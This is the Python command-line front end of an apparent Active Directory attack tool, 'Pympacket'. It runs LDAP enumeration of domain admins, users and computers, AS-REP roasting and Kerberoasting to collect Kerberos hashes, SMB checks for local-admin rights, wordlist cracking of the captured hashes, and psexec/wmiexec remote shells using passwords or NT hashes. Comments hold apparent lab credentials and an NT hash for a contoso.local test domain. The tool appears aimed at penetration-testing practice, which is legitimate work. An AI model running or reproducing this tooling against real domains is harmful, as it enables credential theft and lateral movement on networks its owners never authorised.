from pympacket.utils.asreproasting import asreproast
from pympacket.utils.kerberoasting import kerberoast
from pympacket.utils.raw_ldap_enum import ldap_enum
from pympacket.utils.check_admin_smb import check_admin_smb
from pympacket.utils.storage import Storage, load_storage, save_storage
from pympacket.utils.lateral import psexec, wmiexec
from pympacket.utils.bruteforce import bruteforce
import argparse
from pprint import pprint
import cmd
import os
from pympacket.models.common import Domain, User, Hash, Computer
import re

def ipv4_address(value):
    # Regular expression to match an IPv4 address (four octets)
    pattern = r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
    if not re.match(pattern, value):
        raise argparse.ArgumentTypeError(f"Invalid IPv4 address: {value}")
    return value

def ldap_enum_output(ldap, conn, domain_base, domain, dc_ip):
    domain_info = Domain()
    domain_info.name = domain
    # Enumerate Domain SID
    domain_sid = ldap.domain_sid(conn, domain_base)
    print(f"Domain SID ({domain}): {domain_sid}\n")
    domain_info.sid = domain_sid

    # Enumerate Domain Admins
    domain_admins = ldap.group_member(conn, domain_base, "Domain Admins")
    print("Members of 'Domain Admins':")
    for da in domain_admins:
        print(da)
    print("")

    domain_info.domain_admins = domain_admins

    # Enumerate Domain Users
    domain_users = ldap.enum_users(conn, domain_base)
    print("Domain User Accounts:")
    for user in domain_users:
        print("------------------------------------------")
        print(f"RID: {user['rid']}")
        print(f"Username: {user['username']}")
        print(f"Description: {user['description']}")
        if len(user['memberOf']):
            groups = ""
            for group in user['memberOf']:
                groups += f"{group}, "
            groups = groups[:-2]
        print(f"Groups: {groups}")
        print(f"AdminCount: {user['adminCount']}")
    print("------------------------------------------\n")

    # Enumerate Domain Computers
    computer_objects = []
    domain_computers = ldap.enum_computers(conn, domain_base, dc_ip)
    print("Domain Computers:")
    for computer in domain_computers:
        current_computer = Computer()
        current_computer.name = computer['name']
        current_computer.dns_name = computer['dns_hostname']
        current_computer.ip_address = computer['ip_address']
        current_computer.dc = computer['is_dc']
        if computer['is_dc']:
            domain_info.dc.append(computer['ip_address'])
        computer_objects.append(current_computer)
        print("------------------------------------------")
        print(f"Computer Name: {computer['name']}")
        print(f"DNS Hostname: {computer['dns_hostname']}")
        print(f"IP Address: {computer['ip_address']}")
        print(f"Domain Controller: {computer['is_dc']}")
    print("------------------------------------------\n")
    domain_info.domain_computers = computer_objects
    return domain_info

class ImpacketCLI(cmd.Cmd):
    prompt = '>> '
    intro = 'Welcome to Pympacket. Type "help" for available commands.'
    storage: Storage

    def __init__(self):
        super().__init__()
        self.storage = load_storage()

    def save_user(self, users):
        found = False
        for user in users:
            for saved_user in self.storage.users:
                if user.username == saved_user.username:
                    found = True
                    if len(saved_user.krb_hash) == 0: # Test this shit
                        (saved_user.krb_hash).append(user.krb_hash)
                        save_storage(self.storage)
            if not found:
                self.storage.users.append(user)
                save_storage(self.storage)

    def save_domain(self, domain_info):
        if self.storage.domain_info != None:
            if domain_info.sid == (self.storage.domain_info).sid:
                self.storage.domain_info = domain_info
                save_storage(self.storage)
            else:
                print("\nThere is already a different domain saved in memory,")
                print("to save the new domain you need to wipe all the informations currently stored.")
                choice = ''
                while (choice != '1' and choice != '2'):
                    choice = input("Type (1) to save the new domain and wipe the storage, (2) otherwise: ")
                    if choice == '1':
                        print("Wiping the storage and saving the new domain...\n")
                        self.storage = Storage()
                        save_storage(self.storage)
                        self.storage.domain_info = domain_info
                        save_storage(self.storage)
                    elif choice == '2':
                        print("Operation aborted...\n")
                    else:
                        print("Invalid choice.")
        else:
            self.storage.domain_info = domain_info
            save_storage(self.storage)

    def do_enum(self, args):
        """ Perform Domain Enumeration """
        parser = argparse.ArgumentParser(prog='enum', description='Runs an enumeration test.')
        parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
        parser.add_argument('-dc-ip', type=ipv4_address, required=True, help='The ip of the domain controller. (IPv4)')
        group = parser.add_argument_group()
        group.add_argument('-u', '--username', type=str, required=False, help='The username to test.')
        group.add_argument('-p', '--password', type=str, required=False, help='The password to test.')
        group.add_argument('-nthash', type=str, required=False, help='The NT hash of the user.')
        group.add_argument('-w', '--wordlist', type=str, required=False, help='The wordlist containing the users to test.')
        group.add_argument('-t', '--type', type=str, choices=['auto', 'asrep', 'kerberoast', 'ldap', 'admin'] , required=False, default='auto', help='What kind of enumeration to perform.')
        args = parser.parse_args(args.split())

        if (args.username and (args.password or args.nthash)):
            # Credentialed        
            if args.type == 'auto' or args.type == 'ldap':
                ldap = ldap_enum()
                if args.nthash == None: # Password login
                    conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain, pth=False)
                else:
                    conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.nthash, domain=args.domain, pth=True)
                
                # LDAP Enumeration Output
                domain_info = ldap_enum_output(ldap, conn, domain_base, args.domain, args.dc_ip)
                self.save_domain(domain_info)

                # Enumerate Administrative Privilege
            if args.type == 'auto' or args.type == 'admin':
                ldap = ldap_enum()
                if args.nthash == None: # Password login
                    conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.password, domain=args.domain, pth=False)
                else:
                    conn, domain_base = ldap.login(target=args.dc_ip, user=args.username, password=args.nthash, domain=args.domain, pth=True)
                    
                domain_computers = ldap.enum_computers(conn, domain_base, args.dc_ip)
                print("Checking if the current user is a Local Administrator on a Domain Computer:")
                admin_on = []
                for computer in domain_computers:
                    if computer['ip_address']:
                        if args.nthash == None:
                            result = check_admin_smb(target=computer['ip_address'], username=args.username, domain=args.domain, password=args.password)
                        else:
                            result = check_admin_smb(target=computer['ip_address'], username=args.username, domain=args.domain, nthash=args.nthash)
                        if result:
                            admin_on.append(computer['name'])
                    
                if len(admin_on):
                    for pc in admin_on:
                        print(pc)
                else:
                    print("The current user does not have Local Administrator privileges on any Domain Computer.")
                print("")

            if args.type == 'auto' or args.type == 'asrep':
                asrep_out = asreproast(dc_ip=args.dc_ip, username=args.username, password=args.password, domain=args.domain)
                if asrep_out != None:
                    if len(asrep_out):
                        print("ASREP-Roasted the following users and stored their asrep hash for future bruteforce:")
                        for asrep in asrep_out:
                            print(asrep.username)
                            self.save_user(asrep_out)
                        print("")
                    else:
                        print("There are no users with 'PREAUTH_NOTREQ' on the target Domain.\n")

            if args.type == 'auto' or args.type == 'kerberoast':
                tgs_out = kerberoast(username=args.username, password=args.password, nthash=args.nthash, dc_ip=args.dc_ip, domain=args.domain)
                if tgs_out != None:
                    if len(tgs_out):
                        print("Kerberoasted the following users and stored their TGS for future bruteforce:")
                        for tgs in tgs_out:
                            print(tgs.username)
                            self.save_user(tgs_out)
                        print("")
                    else:
                        print("There are no Service Accounts on the target Domain.\n")
        elif (args.wordlist):
            # Uncredentialed
            if args.type == 'auto' or args.type == 'asrep':
                asrep_out = asreproast(dc_ip=args.dc_ip, domain=args.domain, usersfile=args.wordlist)
                if asrep_out != None:
                    if len(asrep_out):
                        print("ASREP-Roasted the following users and stored their asrep hash for future bruteforce:")
                        for asrep in asrep_out:
                            print(asrep.username)
                            self.save_user(asrep_out)
                        print("")
                    else:
                        print("There are no users with 'PREAUTH_NOTREQ' on the target Domain.\n")
                

            if args.type == 'auto' or args.type == 'ldap':
                ldap = ldap_enum()
                conn, domain_base = ldap.login(target=args.dc_ip, domain=args.domain)
                if conn == None:
                    return None
                domain_info = ldap_enum_output(ldap, conn, domain_base, args.domain, args.dc_ip)
                self.save_domain(domain_info)
                
            if args.type == 'kerberoast' or args.type == 'admin':
                print("You can't perform kerberoasting or check for Local Admin privileges without a valid set of user credentials.")
                return None
        else:
            print("You must specify an user wordlist to perform uncredentialed enumeration")
            return None

    def do_exec(self, args):
        """ miao miao miao """
        parser = argparse.ArgumentParser(prog='exec', description='Spawn a shell on a system, if enough privileges are provided.')
        parser.add_argument('-d', '--domain', type=str, required=True, help='The domain to test.')
        parser.add_argument('-t', '--target', type=ipv4_address, required=True, help='The ip of the domain controller. (IPv4)')
        group = parser.add_argument_group()
        group.add_argument('-u', '--username', type=str, required=True, help='The username to test.')
        group.add_argument('-p', '--password', type=str, required=False, default='', help='The password to test.')
        group.add_argument('-nthash', type=str, required=False, help='The NT hash of the user.')
        group.add_argument('-m', '--mode', type=str, choices=['wmiexec', 'psexec'] , required=False, default='psexec', help='What kind of enumeration to perform.')
        args = parser.parse_args(args.split())
        #d.garza
        #5a642013439f0ab8721115d3a87068db
        # fix cmd class input catching!!!
        if args.mode == 'psexec':
            psexec(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)
        else:
            wmiexec(target=args.target, username=args.username, password=args.password, nthash=args.nthash, domain=args.domain)

    def do_bruteforce(self, args):
        """ miao miao miao """
        parser = argparse.ArgumentParser(prog='enum', description='Runs an enumeration test.')
        parser.add_argument('-w', '--wordlist', type=str, required=True, help='The wordlist containing the users to test.')
        parser.add_argument('-t', '--type', type=str, choices=['all', 'asrep', 'tgs'], required=False, default='all', help='The type of hashes to crack.')
        args = parser.parse_args(args.split())
        cracked_tgs = []
        cracked_asrep = []
        for user in self.storage.users:
            if user.password == None:
                if len(user.krb_hash):
                    for hash in user.krb_hash:
                        if hash.type == 'asrep' and (args.type == 'all' or args.type == 'asrep'):
                            password = bruteforce(args.wordlist, hash)
                            if password:
                                cracked_asrep.append(user.username)
                        if hash.type == 'tgs' and (args.type == 'all' or args.type == 'tgs'):
                            password = bruteforce(args.wordlist, hash)
                            if password:
                                cracked_tgs.append(user.username)

    def do_list_users(self, args):
        """List users credentials."""
        parser = argparse.ArgumentParser(prog='list_users', description='List saved users.')
        parser.add_argument('--hash', action='store_true', required=False, default=False, help='The username to test.')
        parser.add_argument('--cleartext', action='store_true', required=False, default=False, help='The password to test.')
        args = parser.parse_args(args.split())

        if len(self.storage.users):
            print("\nCurrently saved Domain Users:")
            for user in self.storage.users:
                print(f"Username: {user.username}")

                if user.password != None:
                    if args.cleartext:
                        print(f"Password: {user.password}")
                    else:
                        print(f"Password: Saved")
                else:
                    print("Password: Not saved")

                if user.nthash != None:
                    if args.cleartext:
                        print(f"NTLM Hash: {user.nthash}")
                    else:
                        print(f"NTLM Hash: Saved")
                else:
                    print("NTLM Hash: Not saved")
                
                if len(user.krb_hash):
                    if args.hash:
                        print("Kerberos Hashes:")
                        for hash in user.krb_hash:
                            print(f"{hash.type} hash: {hash.value}")
                    else:
                        hash_types = "("
                        for hashes in user.krb_hash:
                            hash_types += f"{hashes.type}, "
                        hash_types = hash_types[:-2]
                        hash_types += ")"
                        print(f"Kerberos Hash: Saved {hash_types}")
                else:
                    print("Kerberos Hash: Not saved")
                print("")
        else:
            print('No users stored in memory.\n')

    def do_get_domain(self, args):
        """Get saved Domain information."""
        parser = argparse.ArgumentParser(prog='domain_info', description='Get saved domain information.')
        parser.add_argument('--computers', action='store_true', required=False, default=False, help='Display detailed computer information.')
        args = parser.parse_args(args.split())

        if self.storage.domain_info != None:
            print("Domain Information:")
            print(f"Name: {self.storage.domain_info.name}")
            print(f"SID: {self.storage.domain_info.sid}")
            dcs = ""
            for dc in self.storage.domain_info.dc:
                dcs += f"{dc}, "
            dcs = dcs[:-2]
            print(f"Domain Controllers: {dcs}")
            if len(self.storage.domain_info.domain_admins):
                das = ""
                for da in self.storage.domain_info.domain_admins:
                    das += f"{da}, "
                das = das[:-2]
                print(f"Domain Admins: {das}")
            if args.computers:
                print("\nDomain Computers:")
                for computer in self.storage.domain_info.domain_computers:
                    print(f"Name: {computer.name}")
                    print(f"DNS Hostname: {computer.dns_name}")
                    print(f"IP Address: {computer.ip_address}")
                    print(f"Domain Controller: {computer.dc}\n")
            else:
                print(f"Domain Computers: {len(self.storage.domain_info.domain_computers)}")
            print("")
        else:
            print("No Domain data stored in memory.\n")

    def do_clear(self, args):
        """Clear the CLI."""
        # For Windows
        if os.name == 'nt':
            os.system('cls')
        # For Linux and macOS
        else:
            os.system('clear')

    def do_forget(self, args):
        """Clears the saved storage and memory."""
        self.storage = Storage()
        save_storage(self.storage)

    def do_quit(self, line):
        """Exit the CLI."""
        save_storage(self.storage)
        return True



cmdLineOptions = argparse.Namespace(
    #username='m.summers',
    #password='&e}h.aj)9?g*',
    #username='l.douglas',
    #password='Football1',
    username=None,
    password=None,
    domain='contoso.local',
    dc_ip='192.168.116.10',
    wordlist='/home/sumzero/pympacket/SamAccountNames.txt',
    type='auto', # 'auto', 'asrep', 'kerberoast', 'ldap', 'admin'
    nthash=None
)

def main():
    cli = ImpacketCLI()
    cli.cmdloop()

# Entry point of the script
if __name__ == "__main__":
    main()

#enumeration(cmdLineOptions)